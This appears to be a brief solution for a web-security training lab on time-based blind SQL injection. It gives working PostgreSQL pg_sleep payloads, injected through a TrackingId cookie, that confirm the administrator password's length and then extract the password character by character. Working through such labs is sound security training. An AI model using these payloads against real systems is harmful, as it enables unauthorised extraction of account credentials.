# Lab 17: Blind SQL Injection with Time Delays and Information Retrieval

* **Solution**: Use pg_sleep in TrackingId to confirm the admin password length, then extract it character-by-character with delays.
* **Final Payloads**:
  * TrackingId=xyz'; SELECT CASE WHEN LENGTH((SELECT password FROM users WHERE username='administrator'))=20 THEN pg_sleep(10) ELSE pg_sleep(0) END -- (confirm length)
  * TrackingId=xyz'; SELECT CASE WHEN SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a' THEN pg_sleep(10) ELSE pg_sleep(0) END -- (repeat for each position)